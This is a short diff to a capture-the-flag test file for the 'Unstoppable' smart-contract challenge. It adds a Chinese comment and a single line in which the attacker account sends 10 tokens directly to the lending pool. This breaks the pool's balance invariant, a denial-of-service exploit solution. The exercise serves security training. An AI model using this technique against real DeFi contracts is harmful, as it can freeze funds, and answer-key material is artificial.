@@ -40,6 +40,9 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //transfer token 到 pool 裡面，就會讓 poolBalance == balanceBefore 這個恆等式不通過
+        await this.token.connect(attacker).transfer(this.pool.address, ethers.utils.parseEther('10'));
+
     });
 
     after(async function () {
